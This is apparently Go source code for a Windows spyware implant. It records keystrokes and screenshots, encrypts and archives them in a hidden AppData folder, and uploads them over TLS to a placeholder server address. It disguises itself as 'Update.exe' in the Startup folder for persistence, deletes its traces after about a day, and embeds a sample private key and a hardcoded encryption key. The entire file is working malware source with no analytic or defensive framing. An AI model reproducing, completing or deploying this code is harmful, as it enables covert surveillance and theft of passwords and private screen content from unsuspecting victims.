package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/user"
	"path"
	"path/filepath"
	"strconv"
	"time"

	"github.com/alistanis/goenc/aes/gcm"
	"github.com/kbinani/screenshot"
	"github.com/kindlyfire/go-keylogger"
)

const BUFFERSIZE = 1024

func main() {
	//TryToConnect("Update.exe")
	user, err := user.Current()
	if err != nil {
		panic(err)
	}

	new := fmt.Sprintf("%s/AppData/Roaming/New Folder/Local/", user.HomeDir)
	start := fmt.Sprintf("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/Update.exe")
	screenshotFolder := fmt.Sprintf("%s/AppData/Roaming/New Folder/Local/Screenshots/", user.HomeDir)

	DeleteFile(new)
	create(new)

	for i := 1; i <= 24; i++ {
		go syncLogger()
		go syncScreenshot(screenshotFolder, new)
		time.Sleep(1800 * time.Second)
		DeleteFile(screenshotFolder)
	}

	DeleteFile(start)
	DeleteFile(new)
	go DeleteFile("Update.exe")

}
func syncLogger() error {
	user, err := user.Current()
	if err != nil {
		panic(err)
	}
	logger := fmt.Sprintf("%s/AppData/Roaming/New Folder/Local/Log Data/%s.txt", user.HomeDir, RandomString())
	encryptedLogger := fmt.Sprintf("%s/AppData/Roaming/New Folder/Local/Log Data/log_%s", user.HomeDir, RandomString())
	go KeyLogger(logger)
	time.Sleep(1800 * time.Second)
	Encrypt(logger, encryptedLogger)
	TryToConnect(encryptedLogger)

	return nil
}

func syncScreenshot(s, u string) error {
	user, err := user.Current()
	if err != nil {
		panic(err)
	}
	comp := fmt.Sprintf("%sSShot%s", u, RandomString())
	encryptedScreenshot := fmt.Sprintf("%s/AppData/Roaming/New Folder/Local/file1_%s.txt", user.HomeDir, RandomString())

	for i := 0; i < 59; i++ {
		TakeScreenshot(s)
		time.Sleep(30 * time.Second) //300
	}
	Compress(s, comp)
	time.Sleep(1 * time.Second)
	Encrypt(comp, encryptedScreenshot)
	time.Sleep(1 * time.Second)
	TryToConnect(encryptedScreenshot)
	DeleteFile(comp)

	return nil
}
func CopyToStartUp(file string) {

	start := fmt.Sprintf("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/Update.exe")
	err := os.Chmod("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/", 0200)
	_, err = os.Stat(start)
	if err != nil {
		if os.IsNotExist(err) {
			sourceFile, err := os.Open(file)
			if err != nil {
				log.Fatal(err)
			}
			defer sourceFile.Close()

			// Create new file
			newFile, err := create(start)
			if err != nil {
				log.Fatal(err)
			}
			defer newFile.Close()

			_, err = io.Copy(newFile, sourceFile)
			if err != nil {
				log.Fatal(err)
			}
		}
	}
}

func TryToConnect(s string) {

	//sample self signed certificate

	certificate := []byte(`-----BEGIN CERTIFICATE-----
MIICzDCCAjWgAwIBAgIUOyYHCi1n7BrgSG9LPP6X0GA6TBowDQYJKoZIhvcNAQEL
BQAweDELMAkGA1UEBhMCdXMxDDAKBgNVBAgMA2lsbDEMMAoGA1UEBwwDY2hpMRAw
DgYDVQQKDAdjb21wYW55MQ0wCwYDVQQLDARzZWN0MQwwCgYDVQQDDAN2YWExHjAc
BgkqhkiG9w0BCQEWD3ZhYUBjb21wYW55LmNvbTAeFw0yMDA3MjExMjI3MTBaFw0y
MTA3MjExMjI3MTBaMHgxCzAJBgNVBAYTAnVzMQwwCgYDVQQIDANpbGwxDDAKBgNV
BAcMA2NoaTEQMA4GA1UECgwHY29tcGFueTENMAsGA1UECwwEc2VjdDEMMAoGA1UE
AwwDdmFhMR4wHAYJKoZIhvcNAQkBFg92YWFAY29tcGFueS5jb20wgZ8wDQYJKoZI
hvcNAQEBBQADgY0AMIGJAoGBAK39j1f/XFfIBsYJavmLLEK88YdD5Z7W4pFKC/Pj
L1wPblytVBH/AwFB/m+qeI0lwgxLt+wxwP1sqi9ujE2xL3Ed6iD92JoGOQZVojD9
MCdWuCfRy+ldujMa37qkZdAa1Ai49ANxStu6jCTfkFFHjhpfzHC+BLmL7MjakbVQ
w/x/AgMBAAGjUzBRMB0GA1UdDgQWBBQ5yuGdi2IOaZ9isaurYLF2IYaaqTAfBgNV
HSMEGDAWgBQ5yuGdi2IOaZ9isaurYLF2IYaaqTAPBgNVHRMBAf8EBTADAQH/MA0G
CSqGSIb3DQEBCwUAA4GBAAB3CKenWNzAHanujrey1HL7su5jeizIBMP++yBflKF0
LKSfM/DNWqaFsdZYyAL2ZiwSmlEKHqU9GbUOmemCjoV1lsrBHKRJZQk5fyEQOGgq
/ZnVdWjn9/ozaGq25CawPWtalETqIMJNC37qJB+3Sf3zEqzretsCskfluc4BGLq3
-----END CERTIFICATE-----`)

	key := []byte(`-----BEGIN PRIVATE KEY-----
MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAK39j1f/XFfIBsYJ
avmLLEK88YdD5Z7W4pFKC/PjL1wPblytVBH/AwFB/m+qeI0lwgxLt+wxwP1sqi9u
jE2xL3Ed6iD92JoGOQZVojD9MCdWuCfRy+ldujMa37qkZdAa1Ai49ANxStu6jCTf
kFFHjhpfzHC+BLmL7MjakbVQw/x/AgMBAAECgYAPducDukW546R+e53Pekg/0k1h
aW6CVLUklsFDNyEhfJmhkSJUyya4OOZlhHBck0uRDjXVv4JYxAzIVHoR+bqunIfE
cczc3v05B7b/PNEpkx+OPauhGQbNI+JcMjd547a9OYWz+1Y6AOEVhh4vny2L5kIa
9v5JFdt198sz1NB48QJBAOSt7OA4rAsn+7pk4dpKXwmUpHdBaA7j9/5PdupblNRK
5KxweWpHfd8KYALPqBSRQe9FPBJOc1/AhqxgnfkOkakCQQDCxv55PmwekqULTpU+
CklSUaSc3XI0baBLeoGrMySW+k+XIWyJRHB8qYZQkdLCKhvouiHbQNcbwY8qwZw9
/EXnAkA6puVPaRmvTtUArKlE3Lhdc7NvJuZyk0PjBSyh1VVp0b+u/rYVbTq6fyW6
8tnQVKVNojtTEq4CzBV+ltVNsM/pAkB/jmBCuI2H7BNn9zunmIbyAQOjsyZCjXSH
WaAnpOOWeDC9UadJsedUzJRomUcD3x3N6G+ZrbnxtG302zxeH6MLAkEAtJgIUMPS
vzxfmyVT3PFdc2Cac6KXc8LLC5C7UW2gkhIlOsHjxUAEwXU9QsCHzJb0QKC5rYNN
mYjqcsPqfyESzQ==
-----END PRIVATE KEY-----`)
	cert, err := tls.X509KeyPair(certificate, key)
	if err != nil {
		log.Fatal(err)
		TryToConnect(s)
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp4", "server_IP_ADDRESS", &config)
	if err != nil {
		TryToConnect(s)
	}
	defer conn.Close()

	file, err := os.Open(s)
	if err != nil {
		log.Fatal(err)
		return
	}
	fileInfo, err := file.Stat()
	if err != nil {
		log.Fatal(err)
		return
	}

	fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := fillString(fileInfo.Name(), 64)
	conn.Write([]byte(fileSize))
	conn.Write([]byte(fileName))
	sendBuffer := make([]byte, BUFFERSIZE)
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		conn.Write(sendBuffer)
	}
}
func fillString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}

	return retunString
}

func create(p string) (*os.File, error) {
	if err := os.MkdirAll(filepath.Dir(p), 0770); err != nil {
		return nil, err
	}
	return os.Create(p)
}
func CopyDir(src string, dst string) error {
	var err error
	var fds []os.FileInfo
	var srcinfo os.FileInfo

	if srcinfo, err = os.Stat(src); err != nil {
		return err
	}

	if err = os.MkdirAll(dst, srcinfo.Mode()); err != nil {
		return err
	}

	if fds, err = ioutil.ReadDir(src); err != nil {
		return err
	}
	for _, fd := range fds {
		srcfp := path.Join(src, fd.Name())
		dstfp := path.Join(dst, fd.Name())

		if fd.IsDir() {
			if err = CopyDir(srcfp, dstfp); err != nil {
				fmt.Println(err)
			}
		} else {
			if err = File(srcfp, dstfp); err != nil {
				fmt.Println(err)
			}
		}
	}
	return nil
}
func File(src, dst string) error {
	var err error
	var srcfd *os.File
	var dstfd *os.File
	var srcinfo os.FileInfo

	if srcfd, err = os.Open(src); err != nil {
		return err
	}
	defer srcfd.Close()

	if dstfd, err = os.Create(dst); err != nil {
		return err
	}
	defer dstfd.Close()

	if _, err = io.Copy(dstfd, srcfd); err != nil {
		return err
	}
	if srcinfo, err = os.Stat(src); err != nil {
		return err
	}
	return os.Chmod(dst, srcinfo.Mode())
}
func compress(src string, buf io.Writer) error {
	// tar > gzip > buf
	zr := gzip.NewWriter(buf)
	tw := tar.NewWriter(zr)

	// walk through every file in the folder
	filepath.Walk(src, func(file string, fi os.FileInfo, err error) error {
		// generate tar header
		header, err := tar.FileInfoHeader(fi, file)
		if err != nil {
			return err
		}

		// must provide real name
		// (see https://golang.org/src/archive/tar/common.go?#L626)
		header.Name = filepath.ToSlash(file)

		// write header
		if err := tw.WriteHeader(header); err != nil {
			return err
		}
		// if not a dir, write file content
		if !fi.IsDir() {
			data, err := os.Open(file)
			if err != nil {
				return err
			}
			if _, err := io.Copy(tw, data); err != nil {
				return err
			}
		}
		return nil
	})

	// produce tar
	if err := tw.Close(); err != nil {
		return err
	}
	// produce gzip
	if err := zr.Close(); err != nil {
		return err
	}
	//
	return nil
}

func Compress(s, t string) error {
	var buf bytes.Buffer
	compress(s, &buf)

	// write the .tar.gzip
	fileToWrite, err := os.OpenFile(t, os.O_CREATE|os.O_RDWR, os.FileMode(600))
	if err != nil {
		panic(err)
	}
	if _, err := io.Copy(fileToWrite, &buf); err != nil {
		panic(err)
	}
	return nil
}

func DeleteFile(s string) error {
	err := os.RemoveAll(s)

	if err != nil {
		log.Fatal(err)
	}
	return nil
}

func Encrypt(s, t string) error {
	//SAMPLE KEY
	key := []byte("49236179763802224376317049986239")

	text, err := ioutil.ReadFile(s)
	if err != nil {
		log.Fatal(err)
		Encrypt(s, t)
	}
	plaintext := []byte(text)

	ciphertext, err := gcm.Encrypt(key, plaintext, 12)
	if err != nil {
		log.Fatal(err)
		Encrypt(s, t)
	}
	enc := base64.RawStdEncoding.EncodeToString(ciphertext)

	f, err := os.Create(t)
	if err != nil {
		log.Fatal(err)
		Encrypt(s, t)
	}

	_, err = io.Copy(f, bytes.NewReader([]byte(enc)))
	if err != nil {
		log.Fatal(err)
		Encrypt(s, t)
	}

	return nil
}

func TakeScreenshot(s string) {
	screen := fmt.Sprintf("%s%s.png", s, RandomString())
	n := screenshot.NumActiveDisplays()
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			log.Fatal(err)
		}

		file, err := create(screen)
		if err != nil {
			log.Fatal(err)
		}
		defer file.Close()
		png.Encode(file, img)
	}
}

func RandomString() string {
	b := make([]byte, 9)
	_, err := rand.Read(b)

	if err != nil {
		fmt.Println(err)
	}
	return base64.URLEncoding.EncodeToString(b)
}

func KeyLogger(s string) {
	const delayKeyfetchMS = 5
	kl := keylogger.NewKeylogger()

	f, err := create(s)
	if err != nil {
		log.Fatal(err)
	}
	for {
		key := kl.GetKey()
		if !key.Empty {
			_, err = f.WriteString(fmt.Sprintf("%c", key.Rune))
			if err != nil {
				panic(err.Error())
			}
		}
		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}
